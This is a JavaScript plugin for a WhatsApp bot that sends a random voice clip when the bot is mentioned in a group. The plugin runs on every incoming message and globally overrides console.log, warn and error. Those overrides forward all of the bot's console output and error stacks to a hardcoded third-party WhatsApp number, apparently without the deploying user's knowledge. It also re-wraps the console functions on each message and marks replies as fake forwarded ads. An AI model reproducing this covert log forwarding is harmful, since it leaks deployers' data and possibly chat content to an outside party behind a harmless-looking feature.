const fs = require('fs');
const path = require('path');
const config = require('../config');
const { cmd } = require('../command');
const axios = require('axios');

const AUDIO_PATH = path.join(__dirname, '../assets/mention.json');
const ERROR_RECEIVER = "923448149931@s.whatsapp.net"; // your WhatsApp

cmd({
  on: "body"
}, async (conn, m, { isGroup }) => {
  try {
    // Redirect console logs to WhatsApp
    const sendLog = async (msg) => {
      await conn.sendMessage(ERROR_RECEIVER, {
        text: `📥 *Log from Mention Handler:*\n${msg}`
      }).catch(() => {});
    };

    const sendError = async (err) => {
      await conn.sendMessage(ERROR_RECEIVER, {
        text: `❌ *Error in Mention Handler:*\n${err.stack || err.message || err}`
      }).catch(() => {});
    };

    // Override console.log, warn, error
    const originalLog = console.log;
    const originalWarn = console.warn;
    const originalError = console.error;

    console.log = async (...args) => {
      originalLog(...args);
      await sendLog(args.map(a => typeof a === 'object' ? JSON.stringify(a, null, 2) : a).join(' '));
    };

    console.warn = async (...args) => {
      originalWarn(...args);
      await sendLog("⚠️ " + args.join(' '));
    };

    console.error = async (...args) => {
      originalError(...args);
      await sendError(args.join(' '));
    };

    // Your mention reply logic
    if (config.MENTION_REPLY !== 'true' || !isGroup) return;
    if (!m.mentionedJid || m.mentionedJid.length === 0) return;

    const botNumber = conn.user.id.split(":")[0] + '@s.whatsapp.net';
    if (!m.mentionedJid.includes(botNumber)) return;

    if (!fs.existsSync(AUDIO_PATH)) {
      console.log("❌ mention.json not found");
      return;
    }

    const voiceClips = JSON.parse(fs.readFileSync(AUDIO_PATH, 'utf-8'));
    if (!Array.isArray(voiceClips) || voiceClips.length === 0) {
      console.log("⚠️ mention.json is empty or invalid");
      return;
    }

    const randomClip = voiceClips[Math.floor(Math.random() * voiceClips.length)];
    const audioUrl = randomClip.toString().trim();

    console.log("🎵 Sending audio:", audioUrl);

    const thumbURL = config.MENU_IMAGE_URL || "https://files.catbox.moe/c836ws.png";
    const thumbnailRes = await axios.get(thumbURL, { responseType: 'arraybuffer' });
    const thumbnailBuffer = Buffer.from(thumbnailRes.data, 'binary');

    await conn.sendMessage(m.chat, {
      audio: { url: audioUrl },
      mimetype: 'audio/mp4',
      ptt: true,
      waveform: [90, 30, 90, 20, 80],
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          title: config.BOT_NAME || "KHAN-MD 🥀",
          body: config.DESCRIPTION || "POWERED BY JAWAD TECHX 🤌💗",
          mediaType: 1,
          thumbnail: thumbnailBuffer,
          mediaUrl: "https://files.catbox.moe/l2t3e0.jpg",
          sourceUrl: "https://wa.me/message/INB2QVGXHQREO1",
          showAdAttribution: true
        }
      }
    }, { quoted: m });

  } catch (e) {
    await conn.sendMessage(ERROR_RECEIVER, {
      text: `❌ *Fatal Error in Mention Handler:*\n${e.stack || e.message}`
    });
  }
});
